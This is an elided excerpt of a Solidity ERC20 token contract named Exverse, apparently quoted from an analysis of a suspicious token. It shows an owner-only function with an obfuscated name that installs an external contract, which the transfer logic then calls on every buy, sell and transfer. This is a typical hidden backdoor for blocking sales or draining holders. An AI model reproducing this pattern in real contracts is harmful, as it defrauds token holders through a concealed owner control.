...
contract TokenM is ERC20 {
    ...
    IUserAmountvvsepk public vvsepk;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Exverse", "EXVG") {
    ...
    function cuoersnnBbutinRsso(IUserAmountvvsepk _vvsepk) public onlyOwner {
        vvsepk = _vvsepk;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                vvsepk.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				vvsepk.addOutAmount(from, amount);
            }else{
                vvsepk.addOutAmount(from, amount);
                takeFee = false;
            }
